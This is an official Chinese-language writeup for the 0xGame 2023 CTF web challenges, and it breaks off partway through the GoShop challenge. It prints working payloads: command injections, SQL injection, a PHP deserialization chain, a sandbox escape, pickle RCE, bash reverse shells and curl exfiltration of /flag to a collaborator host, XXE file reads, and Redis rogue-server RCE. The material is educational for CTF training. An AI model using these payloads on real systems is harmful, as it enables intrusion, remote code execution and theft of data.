---
title: "0xGame 2023 Web Official Writeup"
date: 2023-11-02T11:45:49+08:00
lastmod: 2023-11-02T11:45:49+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

0xGame 2023 Web Official Writeup

<!--more-->

题目源码: https://github.com/X1cT34m/0xGame2023

## Week 1

### signin

考点是 sourcemap 泄露

F12 - 源代码/来源, 找到 /src/main.js

![image-20230928145713537](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021205691.png)

当然也能看 `/assets/index-33309f51.js` 的最后一行

```
//# sourceMappingURL=index-33309f51.js.map
```

访问 `/assets/index-33309f51.js.map` 然后全局搜索 `0xGame` 关键词即可

### hello_http

http 协议基础知识

```http
POST /?query=ctf HTTP/1.1
Host: localhost:8012
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: HarmonyOS Browser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: role=admin
Connection: close
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: 127.0.0.1
Referer: ys.mihoyo.com
Content-Length: 14

action=getflag
```

### repo_leak

Notice 提示 `Using Git for version control`, 存在 `.git` 泄露

```bash
githacker --url http://localhost:8013/ --output-folder test
```

`git commit` 查看历史 commits

![image-20230928150100762](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021205710.png)

回退到上一个版本

```bash
git reset --hard HEAD^
```

本地再起一个 http server 就能看到 flag 了

![image-20230928150214666](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021206746.png)

或者对着本地文件嗯搜也行

### baby_php

首先是 PHP md5 0e 的弱类型比较,  `0e123213` 会被当做科学计数法, 类型转换之后就是 `0`

然后需要绕过 `is_numeric` 和 `intval`

`is_numeric` 如果包含一些乱七八糟的东西比如空格, 字母之类的就会返回 False

`intval` 在类型转换的时候会取整, 因此可以加个小数点, 并且 intval 也会截断非数字的部分

最后是 PHP 伪协议的利用, 需要用 `php://filter` 的过滤器将 flag.php 的内容进行 base64 编码, 最后解码就能拿到 flag

```http
POST /?a=240610708&b=s878926199a HTTP/1.1
Host: localhost:8014
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: name=php://filter/read=convert.base64-encode/resource=flag
Content-Length: 9

c=1024.1a
```

这里需要注意 `name=flag` 并不会拿到 flag, 因为 include 的本质就是执行某个 php 文件, `include('flag.php')` 跟你直接拿浏览器去访问 flag.php 没有任何区别

flag.php 的内容如下

```php
<?php
$flag = 'xxx';
?>
```

include 之后程序只是定义了一个 `$flag` 变量, 也没有别的操作, 更别说查看 flag 了

正确的解法是用 `php://filter`, 将 flag.php 的内容进行 base64 编码, 然后传入 include

include 接受的内容如果以 `<?php` 开头, 则会把这段内容解析为 PHP 代码, 否则会将其视为纯文本, 啥也不干直接输出, 这也是为什么 base64 编码之后就能读到 flag.php 源码的原因

### ping

右键源代码可以看到 hint

```
visit '/api.php?source' for hint
```

sanitize 函数会 replace 一些字符

 `;` 用 `%0a` 绕过, 空格用 `${IFS}` 绕过, `/` 以及 `flag` 用 base64 编码绕过 (网上参考文章很多)

然后 `preg_match` 会匹配一个 IP 的正则表达式, 但是正则前后并没有包含 `^...$`, 因此像 `test127.0.0.1test` 这种形式也能够通过检测

payload

```
ip=#127.0.0.1%0aecho${IFS}Y2F0IC9mbGFnCg==|base64${IFS}-d|bash
```

前端对 IP 的格式做了限制但是并没有什么用, F12 改一改或者直接用 burpsuite 发包就行

## Week 2

### ez_sqli

考察 MySQL 堆叠注入 + 预处理语句绕过 WAF

黑名单过滤了常见的 SQL 关键词, 正常没办法进行 SQL 注入, sqlmap 也跑不出来

首先得知道 mysqlclient (MySQLdb) 的 cursor.execute() 支持执行多条 SQL 语句, 这个也给了 hint

然后, MySQL 支持 SQL 语句的预处理 (set prepare execute), 这个网上搜搜也能找到对应的文章和 payload

```sql
prepare stmt from 'SELECT * FROM users WHERE id=?';
set @id=1;
execute stmt using @id;
```

那么就可以结合这个特性去绕过 WAF

代码我特地开了 debug 模式, 这样方便通过报错注入直接回显数据, 当然也可以用时间盲注, 或者一些其它的方式, 比如直接 insert flag

因为利用 updatexml 报错注入会有长度限制, 所以使用 substr 截取 flag 内容

```sql
# step 1
select updatexml(1,concat(0x7e,(select substr((select flag from flag),1,31)),0x7e),1);
# step 2
select updatexml(1,concat(0x7e,(select substr((select flag from flag),31,99)),0x7e),1);
```

payload

```sql
# step 1
id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65637420737562737472282873656c65637420666c61672066726f6d20666c6167292c312c333129292c30783765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt;
# step 2
id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65637420737562737472282873656c65637420666c61672066726f6d20666c6167292c33312c393929292c30783765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt;
```

### ez_upload

upload.php 通过 content-type 判断图片类型并调用对应的 imagecreatefromXXX 和 imgXXX 函数, 这些函数来自 PHP GD 库, 这个库主要负责处理图片

题目的功能其实是个简单的 "二次渲染", 二次渲染就是指服务端对用户上传的图片进行了二次处理, 例如图片的裁切, 添加水印等等

如果只是在图片的末尾简单的添加了 PHP 代码并上传, 那么经过二次渲染之后的图片是不会包含这段代码的, 因此需要去找一些绕过 GD 库二次渲染的脚本, 然后再构造图片马

https://xz.aliyun.com/t/2657

以 PNG 为例, 直接引用上面文章中的脚本

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'./1.png');
?>
```

上传生成的 1.png 即可, 注意修改文件后缀和 content-type (题目并没有限制文件后缀, 只有二次渲染这一个考点)

![image-20230929153035390](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021206989.png)

### ez_unserialize

考察 PHP 反序列化 POP 链的构造以及 wakeup 的绕过

首先全局找 `__destruct` 方法 (入口点),  也就是 DataObject

```php
class DataObject {
    public $storage;
    public $data;

    public function __destruct() {
        foreach ($this->data as $key => $value) {
            $this->storage->$key = $value;
        }
    }
}
```

遍历 data 的内容, 将 key 和 value 赋值给 storage, 触发 Storage 的 `__set` 方法

```php
class Storage {
    public $store;

    public function __construct() {
        $this->store = array();
    }
    
    public function __set($name, $value) {
        if (!$this->store) {
            $this->store = array();
        }

        if (!$value->expired()) {
            $this->store[$name] = $value;
        }
    }

    public function __get($name) {
        return $this->data[$name];
    }
}
```

如果 store 为空则初始化一个空的 array, 然后调用 value 的 expired 方法, 如果返回 False, 则会将 value 放入 store

Cache 类

```php
class Cache {
    public $key;
    public $value;
    public $expired;
    public $helper;

    public function __construct($key, $value, $helper) {
        $this->key = $key;
        $this->value = $value;
        $this->helper = $helper;

        $this->expired = False;
    }

    public function __wakeup() {
        $this->expired = False;
    }

    public function expired() {
        if ($this->expired) {
            $this->helper->clean($this->key);
            return True;
        } else {
            return False;
        }
    }
}
```

expired 方法会判断内部的 expired 属性是否为 True (注意区分, 一个是方法名一个是类的属性名), 如果为 True 则会调用 helper 的 clean 方法 (实际是 `__call` 方法)

Help 类

```php
class Helper {
    public $funcs;

    public function __construct($funcs) {
        $this->funcs = $funcs;
    }

    public function __call($name, $args) {
        $this->funcs[$name](...$args);
    }
}
```

`__call` 方法会按照传入的 name 从 funcs 数组中取出对应的函数名, 然后将 args 作为参数, 动态调用这个函数, 这里就是最终的利用点, 也就是可以 getshell 的地方

我们如果想要到达 Helper 的 `__call` 方法, 就必须得让 Cache 类的 expired 属性为 True, 但是 Cache 类存在 `__wakeup` 方法, 这就会导致在反序列化刚开始的时候这个 expired 属性会被强制设置为 False, 看起来没有办法绕过

这里引入 PHP  "引用" 的概念, 跟 C 语言类似, 引用是一个类似于指针的东西

```php
$a = 123;
$b = &a; # 将 $a 变量的引用赋值给 $b
```

此时 b 的值就等于 a 的值, 如果 b 被修改, 那么 a 也会被修改, 反之亦然, a 和 b 指向相同的内存地址

那么纵观整个代码, 我们可以让 expired 属性成为某个变量的引用, 这样即使 expired 为 False, 在后续的过程中只要这个被引用的变量被修改为其它值, 那么 expired 也会被修改为相同的值, 只要这个目标值不为 NULL 即可绕过 if 的判断

payload

```php
<?php

class Cache {
    public $key;
    public $value;
    public $expired;
    public $helper;
}

class Storage {
    public $store;
}

class Helper {
    public $funcs;
}

class DataObject {
    public $storage;
    public $data;
}

$helper = new Helper();
$helper->funcs = array('clean' => 'system');

$cache1 = new Cache();
$cache1->expired = False;

$cache2 = new Cache();
$cache2->helper = $helper;
$cache2->key = 'id';

$storage = new Storage();
$storage->store = &$cache2->expired;

$dataObject = new DataObject();
$dataObject->data = array('key1' => $cache1, 'key2' => $cache2);
$dataObject->storage = $storage;

echo serialize($dataObject);
?>
```

首先我们往 dataObject 的 data 里面放入了两个 Cache 实例: cache1 和 cache2

其中 cache2 指定了 helper, 其 key 设置成了要执行的命令 `id`, helper 的 funcs 数组放入了 system 字符串

然后我们让 storage 的 store 属性成为 cache2 expired 属性的引用

这样, 在反序列化时, 首先会调用两个 Cache 的 `__wakeup` 方法, 将各自的 expired 设置为 False

然后调用 dataObject 的 `__destruct` 方法, 从而调用 Storage 的 `__set` 方法

Storage 首先将 store (即 cache1 的 expired 属性) 初始化为一个空数组, 然后存入 cache1

此时, store 不为空, 那么也就是说 cache1 的 expired 属性不为空

然后来到 cache2, storage 的 `__set` 方法调用它的 expired 方法, 进入 if 判断

因为此时 cache2 的 expired 字段, 也就是上面的 store, 已经被设置成了一个数组, 并且数组中存在 cache1 (不为空), 因此这里 if 表达式的结果为 True

最后进入 helper 的 clean 方法, 执行 `system('id');` 实现 RCE

### ez_sandbox

考察简单的 JavaScript 原型链污染绕过 + vm 沙箱逃逸

代码在注册和登录的时候使用了 `clone(req.body)`

```javascript
function merge(target, source) {
    for (let key in source) {
        if (key === '__proto__') {
            continue
        }
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
    return target
}

function clone(source) {
    return merge({}, source)
}
```

根据一些参考文章, 很容易就可以知道这里存在原型链污染, 但是 `__proto__` 关键词被过滤了

如果你对原型链这个概念稍微做一点深入了解, 就可以知道, 对于一个实例对象, 它的 `__proto__` 就等于 `constructor.prototype` (或者仔细搜一搜也能在网上找到现成的 payload), 用这个就可以绕过上面对 `__proto__` 关键词的过滤

先注册一个 test 用户, 在登录时 POST 如下内容, 污染 admins 对象, 使得 `username in admins` 表达式的结果为 True

```json
{
    "username": "test",
    "password": "test",
    "constructor": {
        "prototype": {
            "test": "123"
        }
    }
}
```

然后是一个简单的 vm 沙箱逃逸

https://xz.aliyun.com/t/11859

代码会 catch vm 沙箱执行时抛出的异常, 并访问异常的 message 属性

那么结合上面的文章, 可以通过 throw 抛出对象的思路, 拿到 `arguments.callee.caller` (指向当前函数的调用者), 然后拿到沙箱外的 process 对象, 最终实现 RCE

waf 函数有一些简单的关键词过滤, 不过因为 Javascript 语言本身非常灵活, 所以可以使用中括号 + 字符串拼接的形式绕过

https://www.anquanke.com/post/id/237032

下面两种方式都行

```javascript
// method 1
throw new Proxy({}, { // Proxy 对象用于创建对某一对象的代理, 以实现属性和方法的拦截
    get: function(){ // 访问这个对象的任意一个属性都会执行 get 指向的函数
        const c = arguments.callee.caller
        const p = (c['constru'+'ctor']['constru'+'ctor']('return pro'+'cess'))()
        return p['mainM'+'odule']['requi'+'re']('child_pr'+'ocess')['ex'+'ecSync']('cat /flag').toString();
    }
})
// method 2
let obj = {} // 针对该对象的 message 属性定义一个 getter, 当访问 obj.message 时会调用对应的函数
obj.__defineGetter__('message', function(){
    const c = arguments.callee.caller
    const p = (c['constru'+'ctor']['constru'+'ctor']('return pro'+'cess'))()
    return p['mainM'+'odule']['requi'+'re']('child_pr'+'ocess')['ex'+'ecSync']('cat /flag').toString();
})
throw obj
```

## Week 3

### notebook

https://www.leavesongs.com/PENETRATION/client-session-security.html

首先得知道 flask 的 session 信息存储在 cookie 中, 因此这种 session 也被称作 "客户端 session"

而 session 要想保证不被恶意修改, 就会使用一个 secret key 进行签名

注意 "签名" 不等于 "加密", 我们其实仍然能够看到 session 中存储的信息, 但是无法修改它, 这一点和 JWT (JSON Web Token) 类似

题目中的 secret key

```python
app.config['SECRET_KEY'] = os.urandom(2).hex()
```

这里留了个随机数主要是让大家关注随机数的长度, 如果这个长度过小, 那么很容易就能爆破出来

一部分人可能不知道它长度是多少, 这个其实放到 python 里面运行一下就知道了, 只有 4 位

然后因为是 hex, 所以只会出现 `0123456789abcdef` 这些字符

先手动生成一个四位数字典

```python
import itertools

d = itertools.product('0123456789abcdef', repeat=4)

with open('dicts.txt', 'w') as f:
    for i in d:
        s = ''.join(i)
        f.write(s + '\n')
```

然后找一些现成的工具

https://github.com/noraj/flask-session-cookie-manager

https://github.com/Paradoxis/Flask-Unsign

以 flask-unsign 为例

```bash
flask-unsign -u -c 'eyJub3RlcyI6e319.ZRaiVg.28tEyvEpXfcjFl5rrQ7K_nkl208' -w dicts.txt --no
-literal-eval
```

结果

```bash
[*] Session decodes to: {'notes': {}}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 30208 attempts
b'75c5'
```

然后是个简单的 pickle 反序列化漏洞, 没有任何过滤

```python
@app.route('/<path:note_id>', methods=['GET'])
def view_note(note_id):
    notes = session.get('notes')
    if not notes:
        return render_template('note.html', msg='You have no notes')
    
    note_raw = notes.get(note_id)
    if not note_raw:
        return render_template('note.html', msg='This note does not exist')
    
    note = pickle.loads(note_raw)
    return render_template('note.html', note_id=note_id, note_name=note.name, note_content=note.content)
```

控制 notes 为我们的恶意 pickle 序列化数据即可

这里有几个注意点

首先, 如果你使用 `pickle.dumps()` 来生成 payload, 那么你得知道不同操作系统生成的 pickle 序列化数据是有区别的

参考: https://xz.aliyun.com/t/7436

```python
# Linux (注意 posix)
b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'

# Windows (注意 nt)
b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
```

在 Windows 上生成的 pickle payload 无法在 Linux 上运行

当然如果手动去构造 opcode, 那是没有这个问题的, 比如这段 opcode

```python
b'''cos
system
(S'whoami'
tR.'''
```

其次, 很多人过来问为什么构造了恶意 pickle 序列化数据发送之后服务器报错 500, 其实这个是正常现象, 没啥问题

上面代码在 `pickle.loads()` 之后得到 note 对象, 然后访问它的 id, name, content 属性, 即 `note.id`, `note.name`, `note.content`

如果是正常的 pickle 数据, 那么服务器就会显示正常的 note 内容

如果是恶意的 pickle 数据, 那么 `pickle.loads()` 返回的就是通过 `__reduce__` 方法调用的某个函数所返回的结果, 根本就没有 id, name, content 这些属性, 当然就会报错了

```python
import pickle

class A:
  def __reduce__(self):
    return (str, ("123", ))
  
s = pickle.dumps(A(), protocol=0)
obj = pickle.loads(s)
print(obj) # 123
```

换成 `os.system()` 同理, 在 Linux 中通过这个函数执行的命令, 如果执行成功, 则返回 0, 否则返回非 0 值

虽然服务器会报错 500, 但命令其实还是执行成功的

然后, 也有一部分人问为什么没有回显? 为什么反弹 shell 失败?

首先为什么没有回显我上面已经说了, 而且就算 `os.system()` 有回显你也看不到, 因为回显的内容根本就不会在网页上输出

至于为什么反弹 shell 失败, 提示 `sh: 1: Syntax error: Bad fd number.`, 很多人用的都是这个命令

```bash
bash -i >& /dev/tcp/host.docker.internal/4444 0>&1
```

这个命令存在一些注意点, 首先得理解 bash 反弹 shell 的本质

[https://www.k0rz3n.com/2018/08/05/Linux反弹shell（一）文件描述符与重定向/](https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/)

[https://www.k0rz3n.com/2018/08/05/Linux反弹shell（二）反弹shell的本质/](https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/)

然后你得知道上面这个反弹 shell 的语法其实是 bash 自身的特性, 而其它 shell 例如 sh, zsh 并不支持这个功能

对于题目的环境而言, 当你执行这条命令的时候, 它实际上是在 sh 的 context 中执行的, `>&` 以及 `/dev/tcp/IP/Port` 会被 sh 解析, 而不是 bash, 因此会报错

解决方法也很简单, 将上面的命令使用 `bash -c ""` 包裹起来, 即

```bash
bash -c "bash -i >& /dev/tcp/host.docker.internal/4444 0>&1"
```

让 `>&` 以及 `/dev/tcp/IP/Port` 都被 bash 解析, 就能反弹成功了

而且题目有 python 环境, 用 `python -c "xxx"` 反弹 shell 也行

更何况这题也不是非要反弹 shell, 还有很多其它方法也可以外带回显, 例如 dnslog / Burp Collaborator

```bash
curl i2l42u09eonlu596rrno58j5xw3nrff4.oastify.com -T /flag
curl i2l42u09eonlu596rrno58j5xw3nrff4.oastify.com -X POST -d "`cat /flag`"
```

最后构造 payload, 注意 note id 要对上

```bash
flask-unsign --sign --cookie "{'notes': {'evil': b'''cos\nsystem\n(S'bash -c \"bash -i >& /dev/tcp/host.docker.internal/4444 0>&1\"'\ntR.'''}}" --secret 6061 --no-literal-eval
```

![image-20230929191138796](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207506.png)

### rss_parser

etree.parse 的过程存在 XXE 漏洞

```python
etree.parse(BytesIO(content), etree.XMLParser(resolve_entities=True))
```

将一个符合 RSS Feed XML 标准的 payload 放到 HTTP 服务器上就可以 XXE (也可以参考 `https://exp10it.cn/index.xml` 改一改)

但是无法直接读取 /flag 文件, 这里考察获取 Flask 在 Debug 模式下的 PIN Code 以实现 RCE

https://xz.aliyun.com/t/8092

https://www.tr0y.wang/2022/05/16/SecMap-flask/

读取 `/sys/class/net/eth0/address`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY file SYSTEM "file:///sys/class/net/eth0/address">]>
<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>&file;</title>
        <link>https://exp10it.cn/</link>
        <item>
            <title>test</title>
            <link>https://exp10it.cn/</link>
        </item>
    </channel>
</rss>
```

结果

```
02:42:c0:a8:e5:02
```

转换为十进制

```python
int('02:42:c0:a8:e5:02'.replace(':',''),16)
```

结果为 `2485723391234`

然后读取 machine id 或者 boot id

因为这里不存在 `/etc/machine-id`, 所以读取 `/proc/sys/kernel/random/boot_id`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY file SYSTEM "file:///proc/sys/kernel/random/boot_id">]>
<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>&file;</title>
        <link>https://exp10it.cn/</link>
        <item>
            <title>test</title>
            <link>https://exp10it.cn/</link>
        </item>
    </channel>
</rss>
```

结果

```
d0bb4e23-acae-4f09-a9a9-e13f710e25fa
```

然后根据上面的文章, 读取 `/proc/self/cgroup` 显示 `0::/`, 也就是没有 id 值, 所以不用拼接, 直接用上面的 boot id 就行

剩下的 username 可以通过读取 `/etc/passwd` 来猜一下, 一般都是 `root` 或者最底下的用户 `app`, 多试几个就行

最后随便填一个 url, 比如 `https://exp10it.cn/xxx` 就能在报错页面看到 flask 的路径

exp (注意新版本 flask 计算 pin code 时用的是 sha1, 旧版本才是 md5)

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'app'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '2485723391234',# str(uuid.getnode()),  /sys/class/net/ens33/address
    'd0bb4e23-acae-4f09-a9a9-e13f710e25fa'# get_machine_id(), /etc/machine-id
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

# If we need to generate a pin we salt it a bit more so that we don't
# end up with the same value and generate out 9 digits
num = None
if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

# Format the pincode in groups of digits for easier remembering if
# we don't have a result yet.
rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print(rv)
```

然后进入报错页面输入 PIN Code

![image-20230930154731225](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207096.png)

直接执行 `/readflag` 命令拿到 flag

![image-20230930154844781](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207844.png)

这题不知道为啥做出来的人很少, 其实也不难

如果自己没有服务器放 xxe payload 的话可以借助一些免费的对象存储, 例如腾讯云的 COS 和阿里云的 OSS 服务, 或者用 ngrok 等工具将本机映射到公网也行

### zip_manager

题目实现了在线解压缩 zip 文件的功能, 但是不能进行目录穿越

这里有两种利用方式: zip 软链接和命令注入

先讲第一种

众所周知 Linux 存在软链接这一功能, 而 zip 支持压缩软链接, 程序又是用 unzip 命令进行解压缩, 因此会存在这个漏洞 (相比之下如果使用 Python 的 zipfile 库进行解压缩, 就不会存在这个问题)

```bash
ln -s / test
zip -y test.zip test
```

上传后访问 `http://127.0.0.1:50033/test/test/`

![image-20230930160801834](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207518.png)

然后直接下载 flag 即可

再看第二种

```python
@app.route('/unzip', methods=['POST'])
def unzip():
    f = request.files.get('file')
    if not f.filename.endswith('.zip'):
        return redirect('/')

    user_dir = os.path.join('./uploads', md5(request.remote_addr))
    if not os.path.exists(user_dir):
        os.mkdir(user_dir)

    zip_path = os.path.join(user_dir, f.filename)
    dest_path = os.path.join(user_dir, f.filename[:-4])
    f.save(zip_path)

    os.system('unzip -o {} -d {}'.format(zip_path, dest_path))
    return redirect('/')
```

调用 os.system 执行 unzip 命令, 但是路径是直接拼接过去的, 而 zip 的文件名又可控, 这里存在一个很明显的命令注入

burp 上传时抓包把 filename 改成下面的命令即可 (base64 的知识点在第一周的 writeup 里面就提到过)

```bash
test.zip;echo Y3VybCBob3N0LmRvY2tlci5pbnRlcm5hbDo0NDQ0IC1UIC9mbGFnCg==|base64 -d|bash;1.zip
```

![image-20230930161419225](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207772.png)

命令注入这个点其实跟第一周的 ping 类似, 只不过换了一种形式

### web_snapshot

题目会通过 curl 函数请求网页, 并将 html 源码保存在 Redis 数据库中

请求网页的过程很明显存在 ssrf, 但是限制输入的 url 只能以 http / https 开头

```php
function _get($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
```

这题可能出的有点难了, 因此后面给了一些 hint

首先注意 `curl_setopt` 设置的参数 `CURLOPT_FOLLOWLOCATION`, 代表允许 curl 根据返回头中的 Location 进行重定向

参考: https://www.php.net/manual/zh/function.curl-setopt.php

![image-20230930162418965](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207504.png)

![image-20230930162447209](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207029.png)

![image-20230930162512479](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207958.png)

而 curl 支持 dict / gopher 等协议, 那么我们就可以通过 Location 头把协议从 http 重定向至 dict / gopher, 这个技巧在一些关于 ssrf 的文章里面也会提到

结合 redis 的知识点, 可以尝试 redis 主从复制 rce

https://www.cnblogs.com/xiaozi/p/13089906.html

https://github.com/Dliv3/redis-rogue-server

payload

```python
import requests
import re

def urlencode(data):
    enc_data = ''
    for i in data:
        h = str(hex(ord(i))).replace('0x', '')
        if len(h) == 1:
            enc_data += '%0' + h.upper()
        else:
            enc_data += '%' + h.upper()
    return enc_data

def gen_payload(payload):

    redis_payload = ''

    for i in payload.split('\n'):
        arg_num = '*' + str(len(i.split(' ')))
        redis_payload += arg_num + '\r\n'
        for j in i.split(' '):
            arg_len = '$' + str(len(j))
            redis_payload += arg_len + '\r\n'
            redis_payload += j + '\r\n'

    gopher_payload = 'gopher://db:6379/_' + urlencode(redis_payload)
    return gopher_payload

payload1 = '''
slaveof host.docker.internal 21000
config set dir /tmp
config set dbfilename exp.so
quit
'''

payload2 = '''slaveof no one
module load /tmp/exp.so
system.exec 'env'
quit
'''

print(gen_payload(payload1))
print(gen_payload(payload2))
```

分两次打

```php
<?php

// step 1
header('Location: gopher://db:6379/_%2A%31%0D%0A%24%30%0D%0A%0D%0A%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%30%0D%0A%68%6F%73%74%2E%64%6F%63%6B%65%72%2E%69%6E%74%65%72%6E%61%6C%0D%0A%24%35%0D%0A%32%31%30%30%30%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%33%0D%0A%64%69%72%0D%0A%24%34%0D%0A%2F%74%6D%70%0D%0A%2A%34%0D%0A%24%36%0D%0A%63%6F%6E%66%69%67%0D%0A%24%33%0D%0A%73%65%74%0D%0A%24%31%30%0D%0A%64%62%66%69%6C%65%6E%61%6D%65%0D%0A%24%36%0D%0A%65%78%70%2E%73%6F%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A');

// step 2
// header('Location: gopher://db:6379/_%2A%33%0D%0A%24%37%0D%0A%73%6C%61%76%65%6F%66%0D%0A%24%32%0D%0A%6E%6F%0D%0A%24%33%0D%0A%6F%6E%65%0D%0A%2A%33%0D%0A%24%36%0D%0A%6D%6F%64%75%6C%65%0D%0A%24%34%0D%0A%6C%6F%61%64%0D%0A%24%31%31%0D%0A%2F%74%6D%70%2F%65%78%70%2E%73%6F%0D%0A%2A%32%0D%0A%24%31%31%0D%0A%73%79%73%74%65%6D%2E%65%78%65%63%0D%0A%24%35%0D%0A%27%65%6E%76%27%0D%0A%2A%31%0D%0A%24%34%0D%0A%71%75%69%74%0D%0A%2A%31%0D%0A%24%30%0D%0A%0D%0A');
```

在 vps 上启动一个 php 服务器, 例如 `php -S 0.0.0.0:65000`, 然后让题目去访问这个 php 文件

![image-20230930163412501](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207478.png)

第二次打完之后, 访问给出的 link 拿到回显

```
http://127.0.0.1:50034/cache.php?id=f56f89a264510e2b3aee8461a9859812
```

![image-20230930163502985](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207909.png)

这里得注意几个点

首先 gopher 得分两次打, 不然你在执行 `slaveof IP Port` 命令之后又立即执行了 `slave of no one`, 这就导致根本没有时间去主从复制 exp.so

其次在使用 gopher 发送 redis 命令的时候记得结尾加上 `quit`, 不然会一直卡住

然后注意 redis 的主机名是 `db`, 而不是 `127.0.0.1`, 因此访问 redis 数据库得用 `db:6379`

如果用 dict 协议打的话, 得调整一下 payload 顺序

```
dict://db:6379/config:set:dir:/tmp
dict://db:6379/config:set:dbfilename:exp.so
dict://db:6379/slaveof:host.docker.internal:21000
dict://db:6379/module:load:/tmp/exp.so
dict://db:6379/slave:no:one
dict://db:6379/system.exec:env
dict://db:6379/module:unload:system
```

因为每次执行命令之间会存在一定的时间间隔, 所以得先设置 dir 和 dbfilename, 然后再 slaveof, 不然最终同步的文件名和路径还是原来的 `/data/dump.rdb`

### GoShop

题目是一个商店, 初始 money 为 100, 需要购买金额为 999999999 的 flag 商品后才能拿到 flag

往 number 里面填负数或者小数这种思路都是不行的, 需要仔细看代码的逻辑

BuyHandler
